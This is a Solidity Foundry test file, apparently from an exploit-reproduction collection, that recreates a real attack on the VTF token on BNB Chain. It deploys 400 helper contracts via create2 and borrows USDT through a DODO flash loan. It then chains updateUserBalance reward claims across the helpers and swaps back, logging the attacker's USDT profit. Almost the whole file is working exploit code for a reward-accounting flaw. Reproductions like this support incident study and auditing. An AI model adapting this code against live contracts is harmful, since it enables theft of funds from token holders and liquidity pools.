// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1585575129936977920
// https://twitter.com/peckshield/status/1585572694241988609
// https://twitter.com/BeosinAlert/status/1585587030981218305
// @TX
// https://bscscan.com/tx/0xeeaf7e9662a7488ea724223c5156e209b630cdc21c961b85868fe45b64d9b086
// https://bscscan.com/tx/0xc2d2d7164a9d3cfce1e1dac7dc328b350c693feb0a492a6989ceca7104eef9b7

interface IVTF is IERC20 {
    function updateUserBalance(address _user) external;
}

interface IROUTER {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract claimReward {
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);

    constructor() {
        VTF.updateUserBalance(address(this));
    }

    function claim(address receiver) external {
        VTF.updateUserBalance(address(this));
        VTF.transfer(receiver, VTF.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    address constant dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IROUTER Router = IROUTER(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
    address[] public contractList;

    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    // ankr rpc bsc maybe unavailable, please use QuickNode
    function setUp() public {
        cheat.createSelectFork("bsc", 22_535_101);
    }

    function testExploit() public {
        contractFactory();
        // change time to pass time check
        cheat.warp(block.timestamp + 2 * 24 * 60 * 60);
        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDTToVTF();
        VTF.transfer(contractList[0], VTF.balanceOf(address(this)));
        for (uint256 i = 0; i < contractList.length - 1; ++i) {
            (bool success,) = contractList[i].call(abi.encodeWithSignature("claim(address)", contractList[i + 1]));
            require(success);
        }
        uint256 index = contractList.length - 1;
        (bool success,) = contractList[index].call(abi.encodeWithSignature("claim(address)", address(this)));
        require(success);
        VTFToUSDT();
        USDT.transfer(dodo, 100_000 * 1e18);
    }

    function USDTToVTF() internal {
        USDT.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(VTF);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function VTFToUSDT() internal {
        VTF.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(VTF);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            VTF.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function contractFactory() public {
        address _add;
        bytes memory bytecode = type(claimReward).creationCode;
        for (uint256 _salt = 0; _salt < 400; _salt++) {
            assembly {
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractList.push(_add);
        }
    }
}
